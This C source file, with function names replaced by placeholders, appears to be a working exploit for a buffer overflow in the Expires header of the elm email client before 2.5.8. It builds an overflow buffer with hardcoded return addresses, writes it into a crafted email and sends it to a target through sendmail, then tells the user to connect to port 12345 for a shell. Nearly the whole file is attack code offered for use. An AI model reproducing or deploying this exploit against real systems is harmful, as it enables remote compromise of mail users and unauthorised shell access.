#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int BUFFER ; 
 char* EMAIL ; 
 int /*<<< orphan*/  EXIT_FAILURE ; 
 int EXIT_SUCCESS ; 
 long EXTLOC ; 
 char* STRING ; 
 long STRLOC ; 
 long SYSLOC ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ) ; 
 char* expire ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC2 (char*,char*) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ *,char*,char*,char*,char*) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 scalar_t__ FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC7 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 int /*<<< orphan*/  FUNC9 (char*,char*) ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 
 int FUNC11 (char*) ; 
 scalar_t__ FUNC12 (char*) ; 
 scalar_t__ FUNC13 (char*) ; 

int FUNC14(int argc, char **argv)
{
      char buffer[BUFFER];
      char *email = NULL;
      char *user = NULL;
      int i;
      long extloc, sysloc, strloc;
      FILE *fp;

      if(argc != 2) {
        FUNC10("Usage: ./elmex <user@where.com>");
        FUNC0(EXIT_FAILURE);
      }

      if(FUNC11(argv[1]) > 50) {
              FUNC10("[-] Sorry, email address too long!");
              FUNC0(EXIT_FAILURE);
      }

      user = (char *)FUNC5(FUNC11(argv[1]));
      if(!user) {
              FUNC8("malloc");
              FUNC0(EXIT_FAILURE);
      }

      email = EMAIL;

      FUNC7(user, '\0', FUNC11(argv[1]));
      FUNC6(user, argv[1], FUNC11(argv[1]));

      FUNC10("\nExploit for elm email client < 2.5.8 overflow in Expires field");
      FUNC10("Tested: Redhat on quiet a Sunday by c0ntex[at]open-security.org\n");

      extloc = EXTLOC;
      sysloc = SYSLOC;
      strloc = STRLOC;

      FUNC7(buffer, '\0', BUFFER);
      FUNC6(buffer, expire, FUNC11(expire));

      for(i = FUNC11(expire); i < 53; i++)
              *(buffer+i) = 0x41;
      for(i = 53; i < 57; i += 4)
              *(long *)&buffer[i] = sysloc;
      for(i = 57; i < 61; i++)
              *(long *)&buffer[i] = extloc;
      for(i = 61; i < 65; i += 4)
              *(long *)&buffer[i] = strloc;

      FUNC6(&buffer[65], STRING, FUNC11(STRING));
      buffer[BUFFER] = '\0';

      FUNC10("[-] Adding exploit buffer to email");

      fp = FUNC2(email, "w");
      if(!fp) {
              FUNC8("fopen"); FUNC4(user);
              FUNC0(EXIT_FAILURE);
      }

      FUNC3(fp,
               "From: User c0ntex <c0ntex@open-security.org> Sun Aug 21 13:37:00 2005\n"
               "Return-Path: <c0ntex@localhost\n"
               "Date: Sun, 21 Aug 2005 13:37:00 %s\n"
               "Subject: Insecure?\n"
               "To: %s\n"
               "%s\n", STRING, user, buffer);
      FUNC1(fp);

      FUNC9("[-] Emailing %s with malicious content\n", argv[1]);

      if(FUNC12("/bin/cat ./tmpmail | /usr/sbin/sendmail -t") <0) {
              FUNC8("system");  FUNC4(user);
              FUNC0(EXIT_FAILURE);
      }

      FUNC10("[-] Connect to system on port 12345 to get your shell\n");

      if(FUNC13(EMAIL) <0)
              FUNC8("unlink");

      FUNC4(user);

      return EXIT_SUCCESS;
}